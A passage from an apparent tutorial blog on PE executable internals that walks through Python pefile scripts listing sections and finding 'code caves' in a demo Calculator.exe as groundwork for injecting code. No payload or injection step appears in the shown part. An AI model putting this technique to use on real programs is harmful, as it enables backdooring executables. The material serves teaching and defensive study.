</span>        <span class="n">name</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="n">Name</span><span class="p">.</span><span class="nf">decode</span><span class="p">().</span><span class="nf">strip</span><span class="p">(</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
        
        <span class="c1"># Get section location and size
</span>        <span class="n">virtual_address</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="n">VirtualAddress</span>
        <span class="n">size</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="n">SizeOfRawData</span>
        
        <span class="c1"># Check if this section is executable
</span>        <span class="c1"># Characteristics is a flags field - each bit means something different
</span>        <span class="c1"># Reference: https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#section-flags
</span>        <span class="n">characteristics</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="n">Characteristics</span>
        
        <span class="c1"># Bit 0x20000000 (IMAGE_SCN_MEM_EXECUTE) = section can be executed as code
</span>        <span class="n">is_executable</span> <span class="o">=</span> <span class="p">(</span><span class="n">characteristics</span> <span class="o">&amp;</span> <span class="mh">0x20000000</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span>
        
        <span class="c1"># Print section info with colors
</span>        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}{</span><span class="n">name</span><span class="si">:</span><span class="o">&lt;</span><span class="mi">10</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> at address </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">virtual_address</span><span class="si">:</span><span class="mi">04</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s">, size </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">size</span><span class="si">:</span><span class="mi">5</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes</span><span class="sh">"</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="n">is_executable</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">               </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">^ This section contains EXECUTABLE CODE</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">               </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">The CPU will run instructions from here</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">               </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BLUE</span><span class="si">}</span><span class="s">^ This section contains DATA (not code)</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">               </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BLUE</span><span class="si">}</span><span class="s">Stores strings, numbers, or other information</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        
        <span class="nf">print</span><span class="p">()</span>
    
    <span class="n">pe</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}</span><span class="s">Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;filename.exe&gt;</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">Example: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> Calculator.exe</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="nf">analyze_pe</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</pre></table></code></div></div><p><strong>Understanding the Code:</strong></p><p>The key line is:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">is_executable</span> <span class="o">=</span> <span class="p">(</span><span class="n">characteristics</span> <span class="o">&amp;</span> <span class="mh">0x20000000</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span>
</pre></table></code></div></div><p><strong>What does <code class="language-plaintext highlighter-rouge">0x20000000</code> mean?</strong></p><p>Each section has <strong>characteristics</strong> - a 32-bit number where each bit is a flag (like on/off switches). According to <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#section-flags">Microsoft’s PE Format documentation</a>:</p><ul><li>Bit <code class="language-plaintext highlighter-rouge">0x20000000</code> = <code class="language-plaintext highlighter-rouge">IMAGE_SCN_MEM_EXECUTE</code> = “This section can be executed”<li>Bit <code class="language-plaintext highlighter-rouge">0x40000000</code> = <code class="language-plaintext highlighter-rouge">IMAGE_SCN_MEM_READ</code> = “This section can be read”<li>Bit <code class="language-plaintext highlighter-rouge">0x80000000</code> = <code class="language-plaintext highlighter-rouge">IMAGE_SCN_MEM_WRITE</code> = “This section can be written to”</ul><p><strong>Example:</strong></p><p>If characteristics = <code class="language-plaintext highlighter-rouge">0xE0000020</code>, in binary:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>1110 0000 0000 0000 0000 0000 0010 0000
│││                             │
││└─ WRITE permission           └─ CODE flag
│└── READ permission
└─── EXECUTE permission
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">&amp;</code> (AND) operation checks if bit <code class="language-plaintext highlighter-rouge">0x20000000</code> is set:</p><div class="language-python nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="mh">0xE0000020</span> <span class="o">&amp;</span> <span class="mh">0x20000000</span> <span class="o">=</span> <span class="mh">0x20000000</span>  <span class="c1"># Not zero = executable
</span><span class="mh">0x40000040</span> <span class="o">&amp;</span> <span class="mh">0x20000000</span> <span class="o">=</span> <span class="mh">0x00000000</span>  <span class="c1"># Zero = not executable
</span></pre></table></code></div></div><p><strong>Running the script:</strong></p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 analyze_pe.py Calculator.exe
</pre></table></code></div></div><div class="language-console nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="go">=== Analyzing: Calculator.exe ===

[1] Entry Point: 0x18C0
    This is where the program starts executing
    Like the cookbook saying 'start reading at page 5'

[2] Sections (Chapters):
    Total sections: 6

    .text      at address 0x1000, size  5120 bytes
               ^ This section contains EXECUTABLE CODE
               The CPU will run instructions from here

    .rdata     at address 0x3000, size  5120 bytes
               ^ This section contains DATA (not code)
               Stores strings, numbers, or other information

    .data      at address 0x5000, size   512 bytes
               ^ This section contains DATA (not code)
               Stores strings, numbers, or other information

    .pdata     at address 0x6000, size   512 bytes
               ^ This section contains DATA (not code)
               Stores strings, numbers, or other information

    .rsrc      at address 0x7000, size   512 bytes
               ^ This section contains DATA (not code)
               Stores strings, numbers, or other information

    .reloc     at address 0x8000, size   512 bytes
               ^ This section contains DATA (not code)
               Stores strings, numbers, or other information
</span></pre></table></code></div></div><p><strong>What we learned:</strong></p><ol><li>The program starts at address <code class="language-plaintext highlighter-rouge">0x18C0</code><li>It has 6 sections (chapters)<li>Only <code class="language-plaintext highlighter-rouge">.text</code> section is executable - this is where the actual program code lives<li>Other sections contain data the program uses</ol><p>Now we understand the structure of our Calculator.exe. Let’s move on to finding spaces where we can inject code.</p><h3 id="finding-code-caves"><span class="me-2">Finding Code Caves</span><a href="#finding-code-caves" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="what-is-a-code-cave"><span class="me-2">What is a Code Cave?</span><a href="#what-is-a-code-cave" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Imagine you’re reading a textbook and find several blank pages in the middle of a chapter. The publisher left these pages empty, perhaps for alignment or formatting reasons.</p><p>A <strong>code cave</strong> is similar - it’s <strong>unused space</strong> (empty bytes) inside the executable section of a program.</p><p><strong>Why do code caves exist?</strong></p><p>Compilers sometimes add padding (empty space) for:</p><ul><li>Memory alignment (CPU works faster with aligned data)<li>Section size requirements (sections often need to be multiples of certain sizes)<li>Future updates (leaving room for patches)</ul><p><strong>Analogy:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>Recipe Chapter (Executable Section):
Page 1: Mix ingredients
Page 2: Heat oven to 350°F
Page 3: (BLANK)                    ← Code Cave!
Page 4: (BLANK)                    ← Code Cave!
Page 5: (BLANK)                    ← Code Cave!
Page 6: Bake for 30 minutes
</pre></table></code></div></div><p>An attacker can write their own “recipe” (malicious code) on those blank pages.</p><h4 id="understanding-our-padding-functions"><span class="me-2">Understanding Our Padding Functions</span><a href="#understanding-our-padding-functions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Remember the dummy functions in Calculator.cpp? Now we can explain why they’re there.</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">dummy1</span><span class="p">()</span> <span class="p">{</span> <span class="k">volatile</span> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">x</span><span class="o">++</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">void</span> <span class="nf">dummy2</span><span class="p">()</span> <span class="p">{</span> <span class="k">volatile</span> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">x</span><span class="o">++</span><span class="p">;</span> <span class="p">}</span>
<span class="c1">// ... etc</span>
</pre></table></code></div></div><p><strong>Why we need these:</strong></p><ol><li><strong>Without dummy functions</strong>: Modern compilers optimize aggressively, no wasted space, no code caves<li><strong>With dummy functions</strong>: Compiler allocates space for them, creating gaps between functions<li><strong>These gaps</strong> = Code caves we can use for injection</ol><p>This is intentional for our demonstration. Real-world programs might have caves from:</p><ul><li>Compiler optimizations<li>Section alignment<li>Removed/deprecated functions<li>Debug information stripped</ul><h4 id="finding-code-caves-script"><span class="me-2">Finding Code Caves Script</span><a href="#finding-code-caves-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Now let’s create a script to locate these empty spaces:</p><div file="find_caves.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="find_caves.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">pefile</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="c1"># ANSI Color codes
</span><span class="k">class</span> <span class="nc">Colors</span><span class="p">:</span>
    <span class="n">HEADER</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[95m</span><span class="sh">'</span>
    <span class="n">BLUE</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[94m</span><span class="sh">'</span>
    <span class="n">CYAN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[96m</span><span class="sh">'</span>
    <span class="n">GREEN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[92m</span><span class="sh">'</span>
    <span class="n">YELLOW</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[93m</span><span class="sh">'</span>
    <span class="n">RED</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[91m</span><span class="sh">'</span>
    <span class="n">BOLD</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[1m</span><span class="sh">'</span>
    <span class="n">END</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">find_code_caves</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">min_size</span><span class="o">=</span><span class="mi">50</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">
    Find code caves (empty space) in executable sections
    
    A code cave is continuous null bytes (0x00) in an executable section.
    We look for at least min_size consecutive zeros.
    </span><span class="sh">"""</span>
    <span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="nc">PE</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">=== Code Cave Hunter ===</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">Searching in:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">filename</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">Looking for caves with minimum</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="n">min_size</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">bytes</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="n">caves_found</span> <span class="o">=</span> <span class="mi">0</span>
    
    <span class="c1"># Loop through all sections
</span>    <span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="n">pe</span><span class="p">.</span><span class="n">sections</span><span class="p">:</span>
        <span class="c1"># Get section name
</span>        <span class="n">name</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="n">Name</span><span class="p">.</span><span class="nf">decode</span><span class="p">().</span><span class="nf">strip</span><span class="p">(</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
        
        <span class="c1"># We only care about executable sections
</span>        <span class="n">is_executable</span> <span class="o">=</span> <span class="p">(</span><span class="n">section</span><span class="p">.</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="mh">0x20000000</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span>
        
        <span class="k">if</span> <span class="ow">not</span> <span class="n">is_executable</span><span class="p">:</span>
            <span class="k">continue</span>
        
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[*] Scanning section:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}{</span><span class="n">name</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        
        <span class="c1"># Get the raw bytes of this section
</span>        <span class="n">section_data</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="nf">get_data</span><span class="p">()</span>
        
        <span class="c1"># Now we scan byte-by-byte looking for consecutive zeros
</span>        <span class="n">cave_start_position</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="n">cave_size</span> <span class="o">=</span> <span class="mi">0</span>
        
        <span class="k">for</span> <span class="n">position</span><span class="p">,</span> <span class="n">byte_value</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">section_data</span><span class="p">):</span>
            <span class="c1"># If we find a zero byte
</span>            <span class="k">if</span> <span class="n">byte_value</span> <span class="o">==</span> <span class="mh">0x00</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">cave_start_position</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
                    <span class="n">cave_start_position</span> <span class="o">=</span> <span class="n">position</span>
                <span class="n">cave_size</span> <span class="o">+=</span> <span class="mi">1</span>
            
            <span class="c1"># If we find a non-zero byte
</span>            <span class="k">else</span><span class="p">:</span>
                <span class="c1"># Did we just finish a cave?
</span>                <span class="k">if</span> <span class="n">cave_size</span> <span class="o">&gt;=</span> <span class="n">min_size</span><span class="p">:</span>
                    <span class="c1"># Calculate addresses
</span>                    <span class="n">cave_rva</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="n">VirtualAddress</span> <span class="o">+</span> <span class="n">cave_start_position</span>
                    <span class="n">cave_raw</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="n">PointerToRawData</span> <span class="o">+</span> <span class="n">cave_start_position</span>
                    
                    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">✓ Found cave!</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">Location (RVA):</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">cave_rva</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">Size:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">cave_size</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">bytes</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">File offset:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">HEADER</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">cave_raw</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BLUE</span><span class="si">}</span><span class="s">^ This is </span><span class="si">{</span><span class="n">cave_size</span><span class="si">}</span><span class="s"> consecutive zero bytes</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BLUE</span><span class="si">}</span><span class="s">^ We can write our code here!</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
                    
                    <span class="n">caves_found</span> <span class="o">+=</span> <span class="mi">1</span>
                
                <span class="c1"># Reset for next potential cave
</span>                <span class="n">cave_start_position</span> <span class="o">=</span> <span class="bp">None</span>
                <span class="n">cave_size</span> <span class="o">=</span> <span class="mi">0</span>
        
        <span class="c1"># Don't forget to check if section ended with a cave
</span>        <span class="k">if</span> <span class="n">cave_size</span> <span class="o">&gt;=</span> <span class="n">min_size</span><span class="p">:</span>
            <span class="n">cave_rva</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="n">VirtualAddress</span> <span class="o">+</span> <span class="n">cave_start_position</span>
            <span class="n">cave_raw</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="n">PointerToRawData</span> <span class="o">+</span> <span class="n">cave_start_position</span>
            
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">✓ Found cave!</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">Location (RVA):</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">cave_rva</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">Size:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">cave_size</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">bytes</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">File offset:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">HEADER</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">cave_raw</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
            
            <span class="n">caves_found</span> <span class="o">+=</span> <span class="mi">1</span>
    
